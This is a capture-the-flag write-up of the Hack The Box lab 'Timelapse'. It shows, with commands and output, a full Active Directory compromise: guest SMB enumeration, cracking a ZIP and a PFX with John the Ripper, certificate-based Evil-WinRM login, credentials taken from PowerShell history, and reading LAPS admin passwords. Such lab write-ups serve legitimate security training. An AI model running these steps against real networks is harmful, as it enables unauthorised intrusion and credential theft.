![timelapse](https://github.com/user-attachments/assets/6feecea6-e895-400b-b024-237619d7060b)
# TimeLapse-WriteUp

In this Windows Active Directory machine, we’ll perform a full domain compromise starting from a guest SMB share, extracting sensitive backups, and leveraging certificate-based authentication to pivot into privileged access. You will learn how to:

- Enumerate SMB shares as guest
- Crack protected ZIP and PFX files using John the Ripper
- Extract and use .pfx certificates with OpenSSL
- Authenticate with Evil-WinRM using certificates
- Analyze PowerShell history to recover stored credentials
- Abuse LAPS (Local Administrator Password Solution) for domain escalation

🧰 Tools used: `smbclient`, `john`, `openssl`, `evil-winrm`, `winPEAS`.

Let’s get started.

------

We started by scanning all TCP ports to identify exposed services.
We used the following `nmap` command to detect all open TCP ports on the target. The `-Pn` flag skips host discovery (useful if ICMP is blocked), `-p-` scans all 65535 ports, and `-sS` performs a stealthy SYN scan.

```bash
sudo nmap --open -Pn -p- -sS -n -vvv 10.10.11.152

Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-30 14:43 -0300

<SNIP>

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49719/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 501.03 seconds
           Raw packets sent: 196896 (8.663MB) | Rcvd: 345 (15.180KB)
```
### Service Enumeration:
After identifying open ports, we performed a targeted `nmap` scan on them using version detection and default scripts.
We used `-sVC` to gather service versions and run default scripts. This helps identify running services (like Kerberos, LDAP, SMB, WinRM) and extract useful metadata from them.

```bash
sudo nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695 10.10.11.152
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-30 00:20 -0300
Stats: 0:01:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.07% done; ETC: 00:21 (0:00:00 remaining)
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.21s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-09-30 11:20:07Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/wsmans?
|_ssl-date: 2025-09-30T11:22:01+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn:
|_  http/1.1
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-09-30T11:21:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.16 seconds
```
### SMB Enumeration with NetExec:
We used NetExec (formerly CrackMapExec) to test if anonymous (null) authentication is allowed on the SMB service. This helps determine if we can access shares or perform further enumeration without credentials.
We use a dummy username (a) with an empty password to test for guest or null session access. The result shows we're allowed in as Guest, meaning we can explore some shares.
```bash
nxc smb 10.10.11.152 -u 'a' -p ''
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\a: (Guest)
```
Then we list available SMB shares:
We want to see which shared folders we can access. In this case, we find a readable share named `Shares`, which might contain sensitive files or further credentials.
```bash
nxc smb 10.10.11.152 -u 'a' -p '' --shares
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\a: (Guest)
SMB         10.10.11.152    445    DC01             [*] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share
SMB         10.10.11.152    445    DC01             Shares          READ
SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share
```
### Accessing the Shared Folder and Downloading a Backup
Once we confirmed Guest access, we connected to the `Shares` shared folder using `smbclient`.
`smbclient` allows us to interact with SMB shares similarly to using an FTP client. We connect anonymously (`-N`) and list directories.
```bash
smbclient //10.10.11.152/Shares -U 'a' -I 10.10.11.152 -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \>
```

Inside the folder `Dev`, we discovered a potentially interesting file.
We identified a file named `winrm_backup.zip`. This name hints at a backup related to **WinRM** (Windows Remote Management), which might contain credentials.
We downloaded it.
```bash
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 16:40:06 2021
  ..                                  D        0  Mon Oct 25 16:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 12:46:42 2021

		6367231 blocks of size 4096. 1226722 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)
```
### Cracking ZIP and PFX Credentials:
After downloading the file `winrm_backup.zip`, we suspected it might be password-protected. To confirm this and extract the hash, we used `zip2john`, which converts encrypted ZIP archives into a format that John the Ripper can crack.
```bash
zip2john winrm_backup.zip > backup.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683
```

Then we used John the Ripper with the popular `rockyou.txt` wordlist to crack the password:
```bash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2025-09-30 00:36) 6.666g/s 23156Kp/s 23156Kc/s 23156KC/s swifcat13..supergau
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```


The password was found: `supremelegacy`
We used it to extract the file:
```bash
unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
  inflating: legacyy_dev_auth.pfx
```

This gave us a file named `legacyy_dev_auth.pfx`, which is a **PKCS#12 certificate bundle**, often used to store private keys and certificates — potentially very useful for authenticating to Windows services like WinRM.
```bash  
ls -l
.rw-r--r-- 5.0k n0name 30 Sep 00:34  backup.hash
.rwxr-xr-x 2.6k n0name 25 Oct  2021  legacyy_dev_auth.pfx
.rw-r--r-- 2.6k n0name 30 Sep 00:33  winrm_backup.zip

file legacyy_dev_auth.pfx
legacyy_dev_auth.pfx: data
```

To continue, we extracted the hash from the `.pfx` file with `pfx2john`
```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
```

And again used John to brute-force the password:
```bash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt pfx.hash
Warning: detected hash type "pfx", but the string is also recognized as "pfx-opencl"
Use the "--format=pfx-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:00:29 DONE (2025-09-30 01:10) 0.03356g/s 108484p/s 108484c/s 108484C/s thumper199..thscndsp1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password was successfully cracked: `thuglegacy`

### Authenticating with Evil-WinRM using Certificate & Private Key

After extracting the `.pfx` file (`legacyy_dev_auth.pfx`) from the `winrm_backup.zip`, we suspected it might contain authentication material—either for email, encryption, or remote access. In the context of Active Directory environments, `.pfx` files often store **X.509 certificates and private keys**, which can be used for **certificate-based authentication**, including over **WinRM**.

**Why extract the certificate and private key?**

Because WinRM (Windows Remote Management) supports authentication using certificates instead of usernames and passwords.
If the `.pfx` file contains a certificate tied to a valid domain account (like `legacyy`), and that account is authorized for WinRM access, we can authenticate without needing the actual password.

We extracted the certificate and key with:
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.cert
Enter Import Password:
ls -l
.rw-r--r-- 5.0k n0name 30 Sep 00:34  backup.hash
drwxr-xr-x    - n0name 30 Sep 00:45  env
drwxr-xr-x    - n0name 30 Sep 01:03  johnjumbo
.rw------- 1.2k n0name 30 Sep 01:16  legacy.cert
.rw------- 3.2k n0name 30 Sep 01:12  legacyy_dev_auth.pem
.rwxr-xr-x 2.6k n0name 25 Oct  2021  legacyy_dev_auth.pfx
.rw-r--r-- 5.1k n0name 30 Sep 01:09  pfx.hash
.rw-r--r-- 2.6k n0name 30 Sep 00:33  winrm_backup.zip
```

```bash
cat legacy.cert
Bag Attributes
    localKeyID: 01 00 00 00
subject=CN=Legacyy
issuer=CN=Legacyy
-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
```

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacy.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
ls -l
.rw-r--r-- 5.0k n0name 30 Sep 00:34  backup.hash
drwxr-xr-x    - n0name 30 Sep 00:45  env
drwxr-xr-x    - n0name 30 Sep 01:03  johnjumbo
.rw------- 1.2k n0name 30 Sep 01:16  legacy.cert
.rw------- 2.1k n0name 30 Sep 01:17  legacy.key
.rw------- 3.2k n0name 30 Sep 01:12  legacyy_dev_auth.pem
.rwxr-xr-x 2.6k n0name 25 Oct  2021  legacyy_dev_auth.pfx
.rw-r--r-- 5.1k n0name 30 Sep 01:09  pfx.hash
.rw-r--r-- 2.6k n0name 30 Sep 00:33  winrm_backup.zip
```

```bash
cat legacy.key
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQV89IqR4OLwFpw4pN
72FvqgICCAAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEEGoU0+Z5Onkn59l3
AY3N88wEggTQ6X3YSp3nTDobnW68IheObhCbphTk78AaQa2X1i/PpMHT2UzzYAku
IYkJtvABFTeZLKayn9rrO2p1/pXkyKC5E7gVvQetPGRnUs9ZfyJzZgtGAg/rJ5od
DNZyO2DTReAOE5caFl7Q/7ZmvOReXi6CLzXN9Ze3l2GiqdtTjezKPQ7Cu3LKQRBr
Sb03xAeBUfc+HEzVw3vksvw8YXytnQlZfEyGf3mjtk88OWAJQ0faWoUamWGs+efh
moTcJqqz9/wktPZGhBgI5wp8IHYlT4mpXNZoSBU0q2cR08lAo5stbKAueBdLbz4I
B444iC8bRvOBiCE2alT8hDs7/XEQPo9fO7QaOCz9R2FfGPJiju2BUWjsqI8E4sz1
LcBSYxWSk1WBqHFny5u9FJvKSJqLvw/OLnb9LB2zIXXw24bBCpf29GdFKkiN5eMw
10ljGxJxOKPJaHQ0p862kmap1B/YGkbecfy5Ox8rJa9ZUG60o0y7F2xHGP8VNtnN
/THuy6ky25qASABdcUZ8PO9KXgUfajbPegNXErOz8ky78sdlqvr9CYnQFZNcKUBn
XUMgsCgtj/zzx9g59gIJREfMZvtm8+DsQcjOj/H4tWqlNZr4y1lYQ6UYE3e7r3EV
TGmBgvoRiow7PAv7G4FNiS+B5bHmdQR2yiBJJTrVk76r5tQws+YUiQj7/FxRfVK5
q3HzY1MK6FrecBiozxveFRUn4/03fJPbkIH2QmlVKxYNJcsLHSogcwgThq3w4R52
Scur4ZeABN8kVABuyjzlkSPaEM2yXNkliGA+NhoipIR9+Kux0DOK1F4E9Iu8BCDW
03UdHhyZrxiaq68MKvnoLOyQnAl2PrwNgsqwC2aekH03xdS6qGLyk/zpRa6oOg5H
qtWxgR2RlYsIxL9wnGiPzt7J6kdXQPFX8N2uUVTk8/ZT97xCh7Zth8QnHt5DheQN
AT/+c1QaFyBkfgXvv5IJxNk0sjdSKBLmFZDROariE63aANa2YSEDsJskOw+m7ppW
pQZM+9itIz97wQ9qMXeg8We5x2h7oZsdoQ9SXNOEJnGhrdC9dKRRGbnQOHR+uQbh
KLPc8tsTG61J+5TpKnYiYJIy17weZvRDv+sEflckGjMRCeftYrrxGN1DhjSzUmkA
nSkgCd+37I+qFDSMdW+papOLNl5sWEistMYHufcNf3Qa69fkrI5wYbIEJSXMVHls
7jtlRv3nPz4smLV1KDcjHXDCUS6pIlIa6fy4rhqlU3LUXyLKToiZvjMCIwRViw6s
WQC6iBWVN/2J9smqaQbt0+5YW53GyjzpI4hpY6yGYoCEWgtwYMlsKQpzSZwdT6PE
2TdUZT4G0xwGhQpxabz7qyeI3LQU3g1+gx5YOYf4TSPOD0E2BRooIsZh4TzmqtF7
i8dMj2ouTX39l5d1NP2FNSeHt/DzYVuP1tlS1Pf/zZ52eCKnl+TBGAwk1N5YOHfQ
Vvn8/0aSBmydLwNXAj3YFW2Ui7fE1f5VpNePTgncuDShvcMO4J0XK7gVTz3xU977
Fh36kuUJftxxNOl4lv07Yv8oO8GQIKEOHedqqb2mdcb2SSkpN5H2GnynfbiiyfI1
ZQb/msURZBTM0ir1tF5pBoQL3xgOnLk0Oblx/0c5lLC0FqRi25w1fXM=
-----END ENCRYPTED PRIVATE KEY-----
```

The `.key` file was encrypted, so we cracked its passphrase using `pfx2john` + `john`:
Password: `thuglegacy`

Once we had both components (`legacy.cert` and decrypted `legacy.key`), we attempted WinRM login using `evil-winrm`
```bash
evil-winrm -S -i 10.10.11.152 -u legacyy -c legacy.cert -k legacy.key

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

Evil-WinRM prompted us for the key’s passphrase, and upon successful authentication, we gained an interactive shell as user `legacyy`.
We confirmed access by reading the user flag:
```powershell
cd ../Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/30/2025   4:14 AM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
801aa6ed3f58b6cfc291c9592831c71b
```
### Post-Exploitation
After gaining access as `legacyy`, we proceeded with **post-exploitation enumeration** to identify potential privilege escalation paths. A common first step in this phase is to run **automated enumeration tools** like **winPEAS**.
**Why upload and run winPEAS?**
`winPEAS` automates the discovery of misconfigurations, stored credentials, vulnerable services, and privilege escalation vectors on Windows systems. It's particularly useful for quickly identifying low-hanging fruit that might be missed during manual enumeration.

We uploaded the binary via `evil-winrm`:
```powershell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> upload winPEASx64.exe

Info: Uploading /home/n0name/Documents/HTBLabs/Machines/Easy/Timelapse/winPEASx64.exe to C:\Users\legacyy\Desktop\winPEASx64.exe
Enter PEM pass phrase:

Data: 13555028 bytes of 13555028 bytes copied

Info: Upload successful!
```

And executed it.
```powershell
*Evil-WinRM* PS C:\Users\legacyy\Desktop> .\winPEASx64.exe
Enter PEM pass phrase:
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.

  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------|
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links
```

Among other findings, it highlighted that **PowerShell command history** was available:
```powershell
<SNIP>
ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version:
    Transcription Settings:
    Module Logging Settings:
    Scriptblock Logging Settings:
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B
<SNIP>
```

This file often stores the last commands executed in a PowerShell session—sometimes including passwords or sensitive operations.
We read the contents:
```bash
C:\Users\legacyy\Desktop> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Enter PEM pass phrase:
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Inside, we found a hardcoded password used to create a `PSCredential` object for user `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`

To connect using `evil-winrm`, we used:
`evil-winrm -S -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'`
The `-S` flag forces the use of **SSL (HTTPS)** on port **5986**, which is required when WinRM is configured for **secure communication** only.  
Without `-S`, `evil-winrm` attempts a connection over HTTP (port 5985), which would fail if the server requires SSL.
```powershell
evil-winrm -S -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

Once connected, we confirmed access:
```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Among the groups, we found something interesting `TIMELAPSE\LAPS_Readers`
#### What is `LAPS_Readers`?

`LAPS_Readers` is a **custom Active Directory group** that has **read access to LAPS-managed passwords**.
##### What is LAPS?

**LAPS (Local Administrator Password Solution)** is a Microsoft feature that:

- Randomly generates a **unique local administrator password** for each computer.
- Stores the password in an AD attribute: `ms-Mcs-AdmPwd`.
- Automatically rotates it based on expiration policies.
- Makes it retrievable only by **privileged users or groups** (like `LAPS_Readers`).
- Being part of `LAPS_Readers`, `svc_deploy` can retrieve **local admin passwords** from AD.

We used the following PowerShell command to extract all computers and their LAPS passwords:
```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter * -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime


DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-mcs-admpwd               : vmct)Q3Mo6y5/65iJY{1;ZoO
ms-mcs-admpwdexpirationtime : 134041364447201437
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :

DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DB01
ObjectClass       : computer
ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d
SamAccountName    : DB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1606
UserPrincipalName :

DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : WEB01
ObjectClass       : computer
ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683
SamAccountName    : WEB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1607
UserPrincipalName :

DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DEV01
ObjectClass       : computer
ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca
SamAccountName    : DEV01$
SID               : S-1-5-21-671920749-559770252-3318990721-1608
UserPrincipalName :
```

This revealed the password for the domain controller `DC01`:
`Administrator:vmct)Q3Mo6y5/65iJY{1;ZoO`
This is the local Administrator password for the DC.

Using the credentials, we authenticated as Administrator:
```powershell
evil-winrm -S -i 10.10.11.152 -u 'Administrator' -p 'vmct)Q3Mo6y5/65iJY{1;ZoO'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Then we captured the final flag:
```powershell
*Evil-WinRM* PS C:\Users\TRX\Desktop> dir


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/30/2025   4:14 AM             34 root.txt


*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
3228e81d48155cdec1ec3623370c58f2
```
Rooted!
